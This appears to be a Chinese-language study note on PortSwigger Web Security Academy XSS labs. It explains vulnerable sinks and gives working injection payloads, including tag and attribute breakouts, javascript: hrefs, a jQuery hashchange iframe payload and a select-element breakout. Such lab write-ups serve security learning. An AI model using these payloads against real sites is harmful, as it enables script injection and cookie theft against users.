https://portswigger.net/web-security/cross-site-scripting#how-does-xss-work
1.闭合h1标签
```html
</h1><script>alert(1)</script>\\
```
3.dom型xss，在检查里查看，查看页面源代码看不见的
```html
xxx" onload="alert(1)  \\构造前后闭合
```


```
情景：<a id="backLink" href="/xxx">Back</a>
```
令href=javascript:alert(document.cookie)

## Lab: DOM XSS in jQuery selector sink using a hashchange event
`$(window).on('hashchange', function() {`
    `var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');`
    `if (post) post.get(0).scrollIntoView();`
`});`
逐行解释

    $(window).on('hashchange', function() {...}):
        这行代码使用 jQuery 给 window 对象添加了一个 hashchange 事件监听器。当 URL 中的哈希值（即 # 后面的部分）发生变化时，这个监听器会被触发，执行其中的回调函数。

    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');:
        这一行代码做了两件事：
            获取当前 URL 的哈希值：window.location.hash.slice(1) 获取 URL 中 # 后面的部分，并通过 slice(1) 去掉 #，得到纯文本部分。
            解码哈希值：decodeURIComponent 解码哈希值，因为 URL 中的特殊字符会被编码为 %XX 形式。
            查找匹配的元素：$('section.blog-list h2:contains(...)') 使用 jQuery 选择器在页面上查找位于 section.blog-list 内的所有 <h2> 元素，并筛选出包含解码后的哈希值作为文本内容的 <h2> 元素。如果找到了这样的元素，就将它存储在变量 post 中。

    if (post) post.get(0).scrollIntoView();:
        如果找到了符合条件的 post（即 post 不是空的），则将这个 h2 元素滚动到视图中（scrollIntoView()）。这意味着页面将自动滚动到与哈希值匹配的 <h2> 元素所在的位置。

这段代码通常用于博客或文章列表页面。其作用是当用户点击链接或手动更改浏览器地址栏中的哈希部分时，页面会自动滚动到与哈希值对应的文章标题（\<h2> 标签）。例如，如果 URL 中的哈希值是 My-Article-Title，代码会在 section.blog-list 内查找包含 My Article Title 的 \<h2> 标题，然后自动滚动到这个标题的位置。
可能存在的风险

使用 :contains() 选择器并直接插入用户控制的内容（例如 URL 的哈希值）可能存在一定的安全风险，特别是 XSS（跨站脚本攻击）的风险。因此，在实际开发中，使用这类选择器时应注意对输入内容进行充分的验证和过滤，以防止恶意代码注入。

在这个lab的关键点是，jquery的工作原理：无论是否有任何匹配项，他都会返回jquery的搜索对象
payload
```
<iframe src="https://exploit-0ac6000704c9ae5b80ac431f01ad008b.exploit-server.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

## Lab: Reflected XSS into attribute with angle brackets HTML-encoded
```
" onmouseover="alert(1)
```
该属性会在用户将鼠标移到输入框时触发 alert(1)，从而弹出一个 JavaScript 警告框。
## Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded
在这里我犯错了，新手常见的靶场错误，以为反射xss只会存在评论里，于是我找半天没找到答案里的href，后来发现反射点在名字的超链接哈哈哈
href="javascript:alert(1)"
## Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
payload是
```html
'-alert(1)-'
```
反射点的代码
```html
var searchTerms = 'xxx'-alert(1)-'';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```
'xxx' - alert(1) - '' 这段代码会被 JavaScript 引擎解析并执行。
在 JavaScript 中，使用 - 运算符时，会尝试将两边的操作数转换为数字进行数学运算。
由于 alert(1) 是一个有效的 JavaScript 函数，它会弹出一个带有数字 1 的警告框。
然后 alert(1) 的返回值是 undefined。
'xxx' - undefined - ''：尝试将字符串和 undefined 进行减法运算，结果会是 NaN (Not a Number)，但是这并不影响弹窗的触发。然后nan-''，这里是什么都没有，转换为数字就是0，所以结果还是nan
总结：==弹窗的原因并不是因为 encodeURIComponent() 或 document.write()，而是因为 alert(1) 在表达式计算过程中被直接调用并执行。因此，尽管代码的最终输出不会插入恶意代码，但在计算过程中弹窗已经触发。==
# Lab: DOM XSS in document.write sink using source location.search inside a select element
domxss，我们先打开页面代码，找找script代码，看看有没有我们能控制dom的地方。在这个lab里我们发现storeid可以操纵页面的dom，于是用他来构造闭合
需要注意的是：这里要闭合option之后再闭合select标签
?productId=1&storeId=ppp</option></select><img%20src=1%20onerror=alert(1)>